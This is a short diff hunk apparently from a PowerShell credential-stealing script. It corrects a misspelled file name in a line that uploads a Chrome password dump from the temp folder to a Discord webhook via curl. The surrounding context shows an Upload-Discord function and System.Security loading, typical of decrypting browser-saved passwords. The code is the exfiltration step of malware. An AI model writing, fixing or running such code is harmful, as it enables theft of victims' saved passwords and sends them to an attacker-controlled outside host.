@@ -54,7 +54,7 @@ function Upload-Discord {
         curl.exe -F "file1=@$file" $hookurl
     }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--chrmoe-pass.txt"
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--chrome-pass.txt"
 
 Add-Type -AssemblyName System.Security
 Add-Type @"
